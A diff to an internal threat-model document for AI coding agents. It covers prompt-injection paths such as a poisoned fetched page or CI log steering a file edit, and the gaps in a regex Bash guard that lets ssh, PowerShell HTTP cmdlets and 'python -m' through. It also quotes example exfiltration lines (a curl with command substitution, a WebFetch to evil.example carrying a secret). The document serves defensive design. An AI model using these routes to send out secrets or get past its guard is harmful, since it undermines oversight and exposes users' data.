@@ -34,13 +34,20 @@ Break any one leg and the injection can't complete. *[sourced: Simon Willison, "
   **common** state-changing commands and **some** obvious egress verbs — raw sockets (`nc`/`socat`/
   `telnet`), HTTP egress carrying command substitution (`curl "...?d=$(cat secret)"`), DNS-tunnel
   lookups, and running local scripts / build verbs (`bash deploy.sh`, `make`, `docker`, `terraform`, …).
-  **It is a denylist, NOT a sandbox, and its egress coverage is deliberately INCOMPLETE:** bare `ssh`
-  (the most idiomatic remote-shell + exfil on our stack), PowerShell HTTP cmdlets
-  (`Invoke-WebRequest`/`Invoke-RestMethod`), and programmatic GitHub writes (`gh api … -f/-F`) all
-  **pass** the guard — as do obfuscation, novel interpreters, and new tools. A regex denylist will always
-  be out-run, so never read "the guard allowed it" as "it was safe." The **load-bearing control is
-  OS-level least-privilege credentials** (read-only CAPI / CF scopes that physically cannot mutate prod)
-  **plus an outbound network allowlist**; the guard is only the speed-bump on top.
+  **It is a denylist, NOT a sandbox, and its coverage is INCOMPLETE by construction.** Classes that
+  currently **pass**: bare `ssh` (the most idiomatic remote-shell + exfil on our stack), PowerShell HTTP
+  cmdlets (`Invoke-WebRequest`/`Invoke-RestMethod`), and interpreter module execution
+  (`python -m <module>`) — as do obfuscation, novel interpreters, and new tools. A regex denylist will
+  always be out-run, so never read "the guard allowed it" as "it was safe."
+  > **Do not trust this paragraph over the code.** The authoritative list of what the guard denies is its
+  > test corpus, [`scripts/test_readonly_guard.py`](../../../scripts/test_readonly_guard.py) — read it, or
+  > pipe the command through `scripts/readonly-guard.py` and see. Prose transcribing a control rots the
+  > moment the control is hardened: this list previously claimed `gh api … -f/-F` passed the guard, which
+  > had been **denied** (with a test fixture) for some time.
+
+  The **load-bearing control is OS-level least-privilege credentials** (read-only CAPI / CF scopes that
+  physically cannot mutate prod) **plus an outbound network allowlist**; the guard is only the speed-bump
+  on top.
 - **The guard's `matcher` is `Bash` only — it never sees `WebFetch` / `WebSearch`.** A `WebFetch` of an
   attacker-chosen URL (`https://evil.example/?d=<secret>`) is a **fully un-inspected leg-3 exfil channel**
   that the `readonly-guard` cannot touch, because the hook only fires on the `Bash` tool. So a read-only
@@ -65,14 +72,23 @@ Break any one leg and the injection can't complete. *[sourced: Simon Willison, "
     administrators to bypass protection rules* is disabled** (it is ON by default). Don't substitute a
     local `PreToolUse` denylist on `cf`: it only holds while the agent cooperates, so it reads as a
     control without being one.
-  - **`sde-engineer`, `sre-monitor`, `runbook-author`, `prompt-engineer`** are write-capable
-    (`Write`+`Edit`+`Bash`) with **no PreToolUse hook**, and **all four also hold `WebFetch`** (all but
-    `runbook-author` also `WebSearch`) — so their network-egress leg is bounded by the **outbound
-    allowlist**, not the Bash guard. Containment is not a broken leg but (a) **human review of every write**
-    before it merges/ships (`merge-gate` / PR review) and (b) treating **all fetched/log/PR text as DATA,
-    never instructions** (`handoff-protocol` carries the untrusted taint). Leg-3 reach is the local repo +
-    a PR, not prod — but a poisoned `WebFetch`/log line steering a file write is a real injection surface,
-    so keep their writes human-reviewed and never auto-merged.
+  - **`sde-engineer`, `sre-monitor`, `prompt-engineer`** are write-capable (`Write`+`Edit`+`Bash`) with
+    **no PreToolUse hook**, and **all three also hold `WebFetch`** *and* `WebSearch` — so their
+    network-egress leg is bounded by the **outbound allowlist**, not the Bash guard. (`runbook-author` is
+    also write-capable and holds `WebFetch`, but **does** run the readonly-guard on its `Bash`: its Bash
+    is verification-only by charter, so the hook costs it nothing. Its `Write`/`Edit` and `WebFetch` legs
+    are un-guarded like the rest — the hook narrows leg 3, it does not close it. `sre-monitor` cannot take
+    the same hook: the guard denies the linters/scripts its "validate syntax" step needs.)
+    **No leg is broken.** The dominant path is **single-turn and produces
+    no handoff at all**: `WebFetch` a poisoned page (or `Bash`-read a poisoned CI log) → the injected text
+    steers an `Edit` → the write lands. So the **one control that does not depend on the agent cooperating
+    is (a) human review of every write** before it merges/ships (`merge-gate` / PR review, enforced by
+    **branch protection**). The rest is **prompt-level discipline an injected prompt can talk the agent out
+    of**: (b) treating all fetched/log/PR text as **DATA, never instructions**, and (c) carrying the
+    `[UNTRUSTED]` label in `handoff-protocol`'s `Inputs:` — which only exists on a *handoff*, and the
+    fetch→write path never makes one. Keep (b) and (c) as **hygiene that makes an attack easier to spot in
+    review — not containment.** Leg-3 reach is the local repo + a PR, not prod, so keep every write
+    human-reviewed and never auto-merged.
   - **`test-engineer`** holds `Write`+`Edit`+`Bash` (no `WebFetch`) and **no
     PreToolUse hook**. Lacking `WebFetch` narrows leg 2 but doesn't close it: `Bash` still ingests
     untrusted **test output, DB/query results, and logs** — as do migration files authored with the
